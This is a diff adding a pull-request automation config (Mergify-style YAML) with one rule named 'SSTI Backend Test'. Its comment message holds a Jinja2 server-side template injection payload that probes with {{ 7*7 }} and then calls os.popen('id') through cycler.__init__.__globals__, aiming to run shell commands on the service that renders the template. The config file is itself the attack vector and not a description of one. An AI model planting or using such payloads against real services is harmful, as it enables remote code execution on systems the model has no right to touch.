@@ -1,0 +1,7 @@
+pull_request_rules:
+  - name: SSTI Backend Test
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "Result: {{ 7*7 }} | RCE: {{ cycler.__init__.__globals__.os.popen('id').read() }}"
